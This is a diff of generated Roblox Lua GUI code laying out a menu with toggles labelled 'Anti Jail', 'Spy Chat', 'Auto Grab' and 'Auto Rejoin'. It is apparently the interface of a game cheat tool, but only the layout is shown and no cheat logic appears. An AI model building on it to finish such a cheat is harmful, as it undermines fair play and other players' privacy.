+G2L["220"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.outlineStroke
-G2L["221"] = Instance.new("UIStroke", G2L["220"]);
-G2L["221"]["Thickness"] = 2;
-G2L["221"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text
+G2L["221"] = Instance.new("TextLabel", G2L["220"]);
+G2L["221"]["TextWrapped"] = true;
+G2L["221"]["ZIndex"] = 10;
+G2L["221"]["BorderSizePixel"] = 0;
+G2L["221"]["TextSize"] = 14;
+G2L["221"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["221"]["TextTransparency"] = 0.3;
+G2L["221"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["221"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["221"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["221"]["BackgroundTransparency"] = 1;
+G2L["221"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["221"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["221"]["Text"] = [[Auto Reset]];
+G2L["221"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade
-G2L["222"] = Instance.new("CanvasGroup", G2L["220"]);
-G2L["222"]["BorderSizePixel"] = 0;
-G2L["222"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["222"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["222"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["222"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["222"]["Name"] = [[toggleFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.UIPadding
+G2L["222"] = Instance.new("UIPadding", G2L["221"]);
+G2L["222"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade.UIGradient
-G2L["223"] = Instance.new("UIGradient", G2L["222"]);
-G2L["223"]["Rotation"] = 90;
-G2L["223"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL.text.text
+G2L["223"] = Instance.new("UIStroke", G2L["221"]);
+G2L["223"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text
-G2L["224"] = Instance.new("TextLabel", G2L["21d"]);
-G2L["224"]["TextWrapped"] = true;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL
+G2L["224"] = Instance.new("Frame", G2L["1ac"]);
 G2L["224"]["BorderSizePixel"] = 0;
-G2L["224"]["TextSize"] = 14;
-G2L["224"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["224"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["224"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["224"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["224"]["BackgroundTransparency"] = 1;
-G2L["224"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["224"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["224"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
 G2L["224"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["224"]["Text"] = [[Auto Grab]];
-G2L["224"]["Name"] = [[text]];
-G2L["224"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["224"]["Name"] = [[autorejoinLABEL]];
+G2L["224"]["LayoutOrder"] = 6;
+G2L["224"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.UIPadding
-G2L["225"] = Instance.new("UIPadding", G2L["224"]);
-G2L["225"]["PaddingLeft"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text
+G2L["225"] = Instance.new("TextLabel", G2L["224"]);
+G2L["225"]["TextWrapped"] = true;
+G2L["225"]["ZIndex"] = 10;
+G2L["225"]["BorderSizePixel"] = 0;
+G2L["225"]["TextSize"] = 14;
+G2L["225"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["225"]["TextTransparency"] = 0.3;
+G2L["225"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["225"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["225"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["225"]["BackgroundTransparency"] = 1;
+G2L["225"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["225"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["225"]["Text"] = [[Auto Rejoin]];
+G2L["225"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.text.text
-G2L["226"] = Instance.new("UIStroke", G2L["224"]);
-G2L["226"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.UIPadding
+G2L["226"] = Instance.new("UIPadding", G2L["225"]);
+G2L["226"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.UIPadding
-G2L["227"] = Instance.new("UIPadding", G2L["21d"]);
-G2L["227"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autorejoinLABEL.text.text
+G2L["227"] = Instance.new("UIStroke", G2L["225"]);
+G2L["227"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound
-G2L["228"] = Instance.new("Frame", G2L["206"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail
+G2L["228"] = Instance.new("Frame", G2L["1ac"]);
 G2L["228"]["BorderSizePixel"] = 0;
 G2L["228"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["228"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["228"]["Size"] = UDim2.new(1, 0, 0, 20);
 G2L["228"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["228"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["228"]["Name"] = [[disabledeletesound]];
-G2L["228"]["LayoutOrder"] = 4;
+G2L["228"]["Name"] = [[jail]];
+G2L["228"]["LayoutOrder"] = 2;
 G2L["228"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button
 G2L["229"] = Instance.new("TextButton", G2L["228"]);
 G2L["229"]["BorderSizePixel"] = 0;
 G2L["229"]["TextTransparency"] = 1;
@@ -5080,1609 +5081,2026 @@ G2L["229"]["TextSize"] = 14;
 G2L["229"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["229"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["229"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["229"]["ZIndex"] = 49;
 G2L["229"]["BackgroundTransparency"] = 1;
-G2L["229"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["229"]["Size"] = UDim2.new(0, 20, 0, 20);
 G2L["229"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["229"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.UIPadding
 G2L["22a"] = Instance.new("UIPadding", G2L["229"]);
-G2L["22a"]["PaddingTop"] = UDim.new(0, 2);
+G2L["22a"]["PaddingTop"] = UDim.new(0, 3);
 G2L["22a"]["PaddingRight"] = UDim.new(0, 3);
 G2L["22a"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["22a"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["22a"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame
 G2L["22b"] = Instance.new("Frame", G2L["229"]);
 G2L["22b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
 G2L["22b"]["BorderMode"] = Enum.BorderMode.Inset;
 G2L["22b"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["22b"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["22b"]["Name"] = [[buttonFrame]];
+G2L["22b"]["Name"] = [[toggleFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.outlineStroke
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.outlineStroke
 G2L["22c"] = Instance.new("UIStroke", G2L["22b"]);
 G2L["22c"]["Thickness"] = 2;
 G2L["22c"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade
 G2L["22d"] = Instance.new("CanvasGroup", G2L["22b"]);
 G2L["22d"]["BorderSizePixel"] = 0;
 G2L["22d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["22d"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["22d"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["22d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["22d"]["Name"] = [[buttonFade]];
+G2L["22d"]["Name"] = [[toggleFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.buttonFrame.buttonFade.UIGradient
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.button.toggleFrame.toggleFade.UIGradient
 G2L["22e"] = Instance.new("UIGradient", G2L["22d"]);
 G2L["22e"]["Rotation"] = 90;
 G2L["22e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.disabledeletesound.button.text
-G2L["22f"] = Instance.new("TextLabel", G2L["229"]);
-G2L["22f"]["ZIndex"] = 2;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text
+G2L["22f"] = Instance.new("TextLabel", G2L["228"]);
+G2L["22f"]["TextWrapped"] = true;
 G2L["22f"]["BorderSizePixel"] = 0;
 G2L["22f"]["TextSize"] = 14;
-G2L["22f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["22f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["22f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["22f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["22f"]["BackgroundTransparency"] = 1;
-G2L["22f"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["22f"]["Size"] = UDim2.new(0, 156, 0, 20);
 G2L["22f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["22f"]["Text"] = [[Disable Delete Sound]];
+G2L["22f"]["Text"] = [[Anti Jail]];
 G2L["22f"]["Name"] = [[text]];
+G2L["22f"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.UIPadding
+G2L["230"] = Instance.new("UIPadding", G2L["22f"]);
+G2L["230"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.text
+G2L["231"] = Instance.new("UIStroke", G2L["22f"]);
+G2L["231"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.UIPadding
+G2L["232"] = Instance.new("UIPadding", G2L["228"]);
+G2L["232"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside
+G2L["233"] = Instance.new("Frame", G2L["1a9"]);
+G2L["233"]["BorderSizePixel"] = 0;
+G2L["233"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["233"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["233"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
+G2L["233"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["233"]["Name"] = [[leftside]];
+G2L["233"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab
+G2L["234"] = Instance.new("Frame", G2L["233"]);
+G2L["234"]["BorderSizePixel"] = 0;
+G2L["234"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["234"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["234"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["234"]["Name"] = [[mainTab]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
+G2L["235"] = Instance.new("LocalScript", G2L["234"]);
+G2L["235"]["Name"] = [[mainScriptTCO]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======
+G2L["236"] = Instance.new("Frame", G2L["234"]);
+G2L["236"]["BorderSizePixel"] = 0;
+G2L["236"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["236"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["236"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["236"]["Name"] = [[======ACCENT======]];
+G2L["236"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor
+G2L["237"] = Instance.new("Frame", G2L["236"]);
+G2L["237"]["BorderSizePixel"] = 0;
+G2L["237"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["237"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["237"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["237"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["237"]["Name"] = [[GuiColor]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor.UICorner
+G2L["238"] = Instance.new("UICorner", G2L["237"]);
+
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.UIListLayout
+G2L["239"] = Instance.new("UIListLayout", G2L["234"]);
+G2L["239"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["239"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======
+G2L["23a"] = Instance.new("Frame", G2L["234"]);
+G2L["23a"]["BorderSizePixel"] = 0;
+G2L["23a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23a"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["23a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["23a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23a"]["Name"] = [[======TITLE======]];
+G2L["23a"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text
+G2L["23b"] = Instance.new("TextLabel", G2L["23a"]);
+G2L["23b"]["TextWrapped"] = true;
+G2L["23b"]["BorderSizePixel"] = 0;
+G2L["23b"]["TextSize"] = 14;
+G2L["23b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["23b"]["TextTransparency"] = 0.3;
+G2L["23b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23b"]["BackgroundTransparency"] = 1;
+G2L["23b"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["23b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23b"]["Text"] = [[Main]];
+G2L["23b"]["Name"] = [[text]];
+G2L["23b"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.text
+G2L["23c"] = Instance.new("UIStroke", G2L["23b"]);
+G2L["23c"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.UIPadding
+G2L["23d"] = Instance.new("UIPadding", G2L["23b"]);
+G2L["23d"]["PaddingLeft"] = UDim.new(0, 1);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.minimise
+G2L["23e"] = Instance.new("TextButton", G2L["23a"]);
+G2L["23e"]["BorderSizePixel"] = 0;
+G2L["23e"]["TextTransparency"] = 0.3;
+G2L["23e"]["TextSize"] = 14;
+G2L["23e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["23e"]["BackgroundTransparency"] = 1;
+G2L["23e"]["Size"] = UDim2.new(0, 35, 1, 0);
+G2L["23e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23e"]["Text"] = [[-]];
+G2L["23e"]["Name"] = [[minimise]];
+G2L["23e"]["Position"] = UDim2.new(1, -30, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.greystroke
+G2L["23f"] = Instance.new("UIStroke", G2L["234"]);
+G2L["23f"]["ZIndex"] = 99;
+G2L["23f"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["23f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["23f"]["Name"] = [[greystroke]];
+G2L["23f"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat
+G2L["240"] = Instance.new("Frame", G2L["234"]);
+G2L["240"]["BorderSizePixel"] = 0;
+G2L["240"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["240"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["240"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["240"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["240"]["Name"] = [[spychat]];
+G2L["240"]["LayoutOrder"] = 2;
+G2L["240"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button
+G2L["241"] = Instance.new("TextButton", G2L["240"]);
+G2L["241"]["BorderSizePixel"] = 0;
+G2L["241"]["TextTransparency"] = 1;
+G2L["241"]["TextSize"] = 14;
+G2L["241"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["241"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["241"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["241"]["BackgroundTransparency"] = 1;
+G2L["241"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["241"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["241"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.UIPadding
+G2L["242"] = Instance.new("UIPadding", G2L["241"]);
+G2L["242"]["PaddingTop"] = UDim.new(0, 3);
+G2L["242"]["PaddingRight"] = UDim.new(0, 3);
+G2L["242"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["242"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame
+G2L["243"] = Instance.new("Frame", G2L["241"]);
+G2L["243"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["243"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["243"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["243"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["243"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.outlineStroke
+G2L["244"] = Instance.new("UIStroke", G2L["243"]);
+G2L["244"]["Thickness"] = 2;
+G2L["244"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade
+G2L["245"] = Instance.new("CanvasGroup", G2L["243"]);
+G2L["245"]["BorderSizePixel"] = 0;
+G2L["245"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["245"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["245"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["245"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["245"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade.UIGradient
+G2L["246"] = Instance.new("UIGradient", G2L["245"]);
+G2L["246"]["Rotation"] = 90;
+G2L["246"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text
+G2L["247"] = Instance.new("TextLabel", G2L["240"]);
+G2L["247"]["TextWrapped"] = true;
+G2L["247"]["BorderSizePixel"] = 0;
+G2L["247"]["TextSize"] = 14;
+G2L["247"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["247"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["247"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["247"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["247"]["BackgroundTransparency"] = 1;
+G2L["247"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["247"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["247"]["Text"] = [[Spy Chat]];
+G2L["247"]["Name"] = [[text]];
+G2L["247"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.UIPadding
+G2L["248"] = Instance.new("UIPadding", G2L["247"]);
+G2L["248"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.text
+G2L["249"] = Instance.new("UIStroke", G2L["247"]);
+G2L["249"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.UIPadding
+G2L["24a"] = Instance.new("UIPadding", G2L["240"]);
+G2L["24a"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb
+G2L["24b"] = Instance.new("Frame", G2L["234"]);
+G2L["24b"]["BorderSizePixel"] = 0;
+G2L["24b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24b"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["24b"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["24b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24b"]["Name"] = [[autograb]];
+G2L["24b"]["LayoutOrder"] = 2;
+G2L["24b"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button
+G2L["24c"] = Instance.new("TextButton", G2L["24b"]);
+G2L["24c"]["BorderSizePixel"] = 0;
+G2L["24c"]["TextTransparency"] = 1;
+G2L["24c"]["TextSize"] = 14;
+G2L["24c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["24c"]["BackgroundTransparency"] = 1;
+G2L["24c"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["24c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24c"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.UIPadding
+G2L["24d"] = Instance.new("UIPadding", G2L["24c"]);
+G2L["24d"]["PaddingTop"] = UDim.new(0, 3);
+G2L["24d"]["PaddingRight"] = UDim.new(0, 3);
+G2L["24d"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["24d"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame
+G2L["24e"] = Instance.new("Frame", G2L["24c"]);
+G2L["24e"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["24e"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["24e"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["24e"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["24e"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.outlineStroke
+G2L["24f"] = Instance.new("UIStroke", G2L["24e"]);
+G2L["24f"]["Thickness"] = 2;
+G2L["24f"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame.toggleFade
+G2L["250"] = Instance.new("CanvasGroup", G2L["24e"]);
+G2L["250"]["BorderSizePixel"] = 0;
